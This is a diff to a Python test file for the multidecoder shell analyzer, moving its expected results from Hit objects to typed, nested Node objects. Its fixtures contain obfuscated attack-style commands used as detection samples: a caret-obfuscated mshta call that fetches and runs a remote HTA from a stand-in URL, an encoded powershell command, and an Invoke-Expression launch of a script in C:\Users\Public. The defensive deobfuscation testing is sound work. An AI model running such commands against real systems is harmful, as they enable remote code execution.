@@ -8,7 +8,7 @@ from multidecoder.analyzers.shell import (
     get_powershell_command,
     strip_carets,
 )
-from multidecoder.hit import Hit
+from multidecoder.node import Node
 
 test = b"SET.NAME(a , cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html)"
 
@@ -85,7 +85,8 @@ def test_strip_carets_unclosed_string():
 # find_cmd_strings
 def test_find_cmd_strings():
     assert find_cmd_strings(test) == [
-        Hit(
+        Node(
+            type_="shell.cmd",
             value=b"cmd /c mshta http://some.url/x.html",
             start=13,
             end=55,
@@ -98,11 +99,21 @@ def test_find_cmd_strings():
 def test_find_powershell_strings_enc():
     ex = b"powershell /e ZQBj^AGgAbwAgAGIAZQ^BlAA=="
     assert find_powershell_strings(ex) == [
-        Hit(
-            value=b"powershell -Command echo bee",
-            obfuscation=["unescape.shell.carets", "powershell.base64"],
+        Node(
+            type_="shell.cmd",
+            value=b"powershell /e ZQBjAGgAbwAgAGIAZQBlAA==",
+            obfuscation="unescape.shell.carets",
             start=0,
             end=len(ex),
+            children=[
+                Node(
+                    "shell.powershell",
+                    b"powershell -Command echo bee",
+                    "powershell.base64",
+                    0,
+                    28,
+                )
+            ],
         )
     ]
 
@@ -113,9 +124,10 @@ def test_find_powershell_for_loop():
         b"| %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"') do echo prx.%%a"
     )
     assert find_powershell_strings(ex) == [
-        Hit(
+        Node(
+            type_="shell.powershell",
             value=b"powershell -Command \"hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"",
-            obfuscation=[],
+            obfuscation="",
             start=27,
             end=96,
         )
@@ -125,9 +137,10 @@ def test_find_powershell_for_loop():
 def test_find_powershell_strings_invoke_expression():
     ex = b"Invoke-Expression 'PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1'"
     assert find_powershell_strings(ex) == [
-        Hit(
+        Node(
+            type_="shell.powershell",
             value=b"PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1",
-            obfuscation=[],
+            obfuscation="",
             start=19,
             end=len(ex) - 1,
         )
